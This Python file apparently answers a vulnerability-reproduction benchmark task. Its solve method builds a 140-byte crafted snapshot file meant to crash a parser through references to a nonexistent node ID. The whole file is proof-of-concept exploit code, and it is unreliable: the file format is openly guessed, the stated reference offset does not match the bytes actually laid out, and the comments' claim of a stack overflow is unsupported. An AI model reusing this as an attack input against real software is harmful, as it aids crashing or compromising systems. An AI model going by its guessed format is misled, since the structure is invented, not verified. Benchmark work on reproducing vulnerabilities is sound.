import struct
import tempfile
import os
import subprocess
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal snapshot format that triggers the vulnerability
        # Based on typical memory snapshot structures with node references
        
        # Snapshot header format (assumed based on common patterns):
        # - Magic number (4 bytes)
        # - Version (4 bytes)
        # - Node count (4 bytes)
        # - Reference section offset (4 bytes)
        
        # Structure to trigger the vulnerability:
        # 1. Create valid header
        # 2. Create node table with valid nodes
        # 3. Create reference section with invalid node IDs
        # 4. The processor will try to dereference these invalid IDs without checking
        
        # Build the PoC bytes
        poc = bytearray()
        
        # Magic number (assumed)
        poc.extend(b'SNP\x01')
        
        # Version
        poc.extend(struct.pack('<I', 1))
        
        # Node count - set to 1 to pass basic validation
        poc.extend(struct.pack('<I', 1))
        
        # Reference section offset
        poc.extend(struct.pack('<I', 0x20))
        
        # Node table - single valid node
        # Node ID: 0
        # Node data: just padding
        poc.extend(struct.pack('<I', 0))  # Node ID
        poc.extend(b'X' * 16)  # Node data
        
        # Reference section
        # Format: reference count followed by reference entries
        # Each reference: target node ID
        
        # The vulnerability: processor doesn't check if referenced nodes exist
        # before dereferencing the iterator. We'll reference non-existent nodes.
        
        # Reference count - make it large enough to overflow stack
        # when trying to process invalid references
        ref_count = 20  # Enough to cause overflow during processing
        poc.extend(struct.pack('<I', ref_count))
        
        # Reference entries with invalid node IDs
        # Using node ID 999 which doesn't exist in the node_id_map
        invalid_node_id = 999
        for _ in range(ref_count):
            poc.extend(struct.pack('<I', invalid_node_id))
        
        # Pad to exact ground-truth length of 140 bytes
        current_len = len(poc)
        if current_len < 140:
            poc.extend(b'A' * (140 - current_len))
        elif current_len > 140:
            poc = poc[:140]
        
        return bytes(poc)
